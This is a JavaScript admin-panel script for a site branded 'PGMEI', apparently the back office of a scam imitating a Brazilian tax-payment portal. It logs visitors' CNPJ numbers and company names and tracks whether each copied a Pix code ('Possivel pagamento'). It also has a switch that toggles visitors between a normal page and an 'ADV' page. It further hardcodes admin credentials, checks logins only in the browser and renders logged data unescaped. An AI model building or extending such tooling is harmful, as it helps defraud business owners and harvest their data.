(function() {
  const PANEL_SESSION_KEY = "pgmeiPanelSession";
  const DEFAULT_ADMIN = { username: "macaco", password: "macaquinhoronald" };
  const DEFAULT_ANALYTICS_STATE = window.PGMEI.DEFAULT_STATE.analytics;
  let appStateCache = null;
  let panelPollingTimer = null;

  function getDefaultAppState() {
    return JSON.parse(JSON.stringify(window.PGMEI.DEFAULT_STATE));
  }

  function mergeAppState(state) {
    return {
      admin: Object.assign({}, DEFAULT_ADMIN, state && state.admin ? state.admin : {}),
      analytics: Object.assign({}, DEFAULT_ANALYTICS_STATE, state && state.analytics ? state.analytics : {})
    };
  }

  function getAppState() {
    if (!appStateCache) {
      appStateCache = getDefaultAppState();
    }
    return appStateCache;
  }

  function getAdminCredentials() {
    return getAppState().admin || DEFAULT_ADMIN;
  }

  function getAnalyticsState() {
    return getAppState().analytics || DEFAULT_ANALYTICS_STATE;
  }

  async function fetchRemoteAppState() {
    try {
      appStateCache = mergeAppState(await window.PGMEI.fetchState());
    } catch (error) {
      if (!appStateCache) {
        appStateCache = getDefaultAppState();
      }
    }
    return getAppState();
  }

  async function sendAppAction(action, params) {
    try {
      appStateCache = mergeAppState(await window.PGMEI.sendAction(action, params));
      return getAppState();
    } catch (error) {
      showToast(
        "error",
        "Falha ao salvar",
        window.PGMEI.isSupabaseConfigured()
          ? "Nao foi possivel sincronizar o painel com o Supabase."
          : "Supabase nao configurado. O painel esta operando apenas localmente neste navegador."
      );
      throw error;
    }
  }

  function showToast(type, title, message) {
    const stack = document.getElementById("toast-stack");
    const toast = document.createElement("div");
    toast.className = `toast ${type}`;
    toast.innerHTML = `
      <div class="toast-title">${title}</div>
      <div class="toast-message">${message}</div>
    `;
    stack.appendChild(toast);

    setTimeout(() => {
      toast.classList.add("hide");
      setTimeout(() => toast.remove(), 280);
    }, 2600);
  }

  async function pulseButton(button, callback) {
    button.classList.add("loading");
    await new Promise((resolve) => setTimeout(resolve, 420));
    try {
      await callback();
    } finally {
      button.classList.remove("loading");
    }
  }

  function labelDate(dateValue) {
    return dateValue ? new Date(dateValue).toLocaleString("pt-BR") : "Nenhum";
  }

  function renderList(targetId, items, emptyText, formatter) {
    const target = document.getElementById(targetId);
    target.innerHTML = "";

    if (!items.length) {
      target.innerHTML = `<div class="muted">${emptyText}</div>`;
      return;
    }

    items.forEach((item) => {
      const wrapper = document.createElement("div");
      wrapper.className = "list-item";
      wrapper.innerHTML = formatter(item);
      target.appendChild(wrapper);
    });
  }

  function updateActivityChart(state) {
    const metrics = [
      { key: "visits", label: "acessos", element: "bar-visits", value: "bar-value-visits" },
      { key: "uniqueVisitors", label: "unicos", element: "bar-unique", value: "bar-value-unique" },
      { key: "totalClicks", label: "cliques", element: "bar-clicks", value: "bar-value-clicks" },
      { key: "cnpjLogins", label: "logins", element: "bar-logins", value: "bar-value-logins" },
      { key: "activePageMetric", label: "status", element: "bar-page", value: "bar-value-page" }
    ];

    const stateForChart = Object.assign({}, state, {
      activePageMetric: state.activePage === "primary" ? 1 : 2
    });

    const maxValue = Math.max(1, ...metrics.map((item) => stateForChart[item.key] || 0));
    const strongest = metrics.reduce((best, item) => (stateForChart[item.key] > (stateForChart[best.key] || 0) ? item : best), metrics[0]);

    metrics.forEach((item) => {
      const rawValue = stateForChart[item.key] || 0;
      const height = Math.max(8, Math.round((rawValue / maxValue) * 100));
      document.getElementById(item.element).style.setProperty("--bar-height", `${height}%`);
      document.getElementById(item.value).textContent = item.key === "activePageMetric"
        ? (state.activePage === "primary" ? "Site" : "ADV")
        : rawValue;
    });

    document.getElementById("badge-top-metric").textContent = `Mais forte: ${strongest.label}`;
    document.getElementById("badge-live-status").textContent = state.activePage === "primary" ? "Operacao normal" : "Pagina ADV ativa";
    document.getElementById("mini-engagement").textContent = state.totalClicks;
    document.getElementById("mini-uptime").textContent = state.activePage === "primary" ? "Operacao normal" : "Pagina ADV ativa";
  }

  function refreshDashboard() {
    const state = getAnalyticsState();

    document.getElementById("metric-visits").textContent = state.visits;
    document.getElementById("metric-unique").textContent = state.uniqueVisitors;
    document.getElementById("metric-clicks").textContent = state.totalClicks;
    document.getElementById("metric-logins").textContent = state.cnpjLogins;
    document.getElementById("metric-active-page").textContent = state.activePage === "primary" ? "Site" : "ADV";
    document.getElementById("last-visit-text").textContent = labelDate(state.lastVisitAt);
    document.getElementById("last-sync-text").textContent = labelDate(state.lastVisitAt || state.lastPaymentAt);
    document.getElementById("active-page-text").textContent = state.activePage === "primary" ? "Principal" : "ADV";
    document.getElementById("status-mode-text").textContent = state.activePage === "primary" ? "Operacao normal" : "Pagina ADV ativa";
    document.getElementById("status-screen-text").textContent = state.activePage === "primary" ? "Pagina principal" : "Pagina ADV";
    document.getElementById("storage-provider-text").textContent = window.PGMEI.getStorageProviderName() === "supabase" ? "Supabase global" : "Modo local";

    const statusPill = document.getElementById("dashboard-status-pill");
    statusPill.className = `status-pill ${state.activePage === "primary" ? "primary" : "secondary"}`;
    statusPill.textContent = state.activePage === "primary" ? "Pagina principal ativa" : "Pagina ADV ativa";

    const accessItems = (state.accessLog || []).filter((item) => item.cnpj || item.page === "secondary");
    renderList("access-log-list", accessItems.length ? accessItems : state.accessLog, "Nenhum acesso registrado ainda.", (item) => {
      const cnpjText = item.cnpj ? item.cnpj : "Nao informado";
      const companyText = item.companyName ? item.companyName : (item.page === "primary" ? "Acesso geral" : "Pagina ADV");
      let pixText = "Nao gerou Pix";
      if (item.pixCopied) {
        pixText = "Pix copiado";
      } else if (item.pixGenerated) {
        pixText = "Gerou Pix";
      }
      const paidHint = item.pixCopiedAt ? "Possivel pagamento" : pixText;
      return `
        <div><strong>${labelDate(item.time)}</strong></div>
        <div>${companyText}</div>
        <div>CNPJ: ${cnpjText}</div>
        <div>${paidHint}</div>
      `;
    });

    updateActivityChart(state);
  }

  function setDashboardVisible(isVisible) {
    document.getElementById("login-view").classList.toggle("hidden", isVisible);
    document.getElementById("dashboard-view").classList.toggle("hidden", !isVisible);
  }

  function authenticate() {
    const credentials = getAdminCredentials();
    const username = document.getElementById("admin-username").value.trim();
    const password = document.getElementById("admin-password").value;

    if (username === credentials.username && password === credentials.password) {
      localStorage.setItem(PANEL_SESSION_KEY, "1");
      setDashboardVisible(true);
      refreshDashboard();
      showToast("success", "Acesso liberado", "Login realizado com sucesso no painel.");
    } else {
      showToast("error", "Acesso negado", "Usuario ou senha invalidos.");
    }
  }

  async function setActivePage(pageName) {
    await sendAppAction("set_active_page", { page: pageName });
    refreshDashboard();
    showToast(
      "info",
      pageName === "primary" ? "Pagina principal ativa" : "Pagina ADV ativa",
      pageName === "primary"
        ? "O site principal voltou ao ar para os visitantes."
        : "A pagina ADV esta sendo exibida aos visitantes."
    );
  }

  async function initializePanel() {
    await fetchRemoteAppState();
    refreshDashboard();
    setDashboardVisible(localStorage.getItem(PANEL_SESSION_KEY) === "1");

    if (panelPollingTimer) {
      clearInterval(panelPollingTimer);
    }

    panelPollingTimer = setInterval(async () => {
      await fetchRemoteAppState();
      if (localStorage.getItem(PANEL_SESSION_KEY) === "1") {
        refreshDashboard();
      }
    }, 4000);

    if (!window.PGMEI.isSupabaseConfigured()) {
      showToast("info", "Modo local", "Supabase ainda nao configurado. O painel sincroniza apenas neste navegador ate voce preencher assets/supabase-config.js.");
    }
  }

  document.getElementById("btn-admin-login").addEventListener("click", function() {
    pulseButton(this, authenticate);
  });
  document.getElementById("admin-password").addEventListener("keydown", function(event) {
    if (event.key === "Enter") {
      event.preventDefault();
      pulseButton(document.getElementById("btn-admin-login"), authenticate);
    }
  });
  document.getElementById("btn-logout-admin").addEventListener("click", () => {
    localStorage.removeItem(PANEL_SESSION_KEY);
    document.getElementById("admin-password").value = "";
    setDashboardVisible(false);
    showToast("info", "Sessao encerrada", "Voce saiu do painel administrativo.");
  });
  document.getElementById("btn-open-main").addEventListener("click", () => {
    window.open("../", "_blank");
  });
  document.getElementById("btn-activate-primary").addEventListener("click", function() {
    pulseButton(this, async () => setActivePage("primary"));
  });
  document.getElementById("btn-activate-secondary").addEventListener("click", function() {
    pulseButton(this, async () => setActivePage("secondary"));
  });

  window.addEventListener("beforeunload", () => {
    if (panelPollingTimer) {
      clearInterval(panelPollingTimer);
    }
  });

  initializePanel();
})();
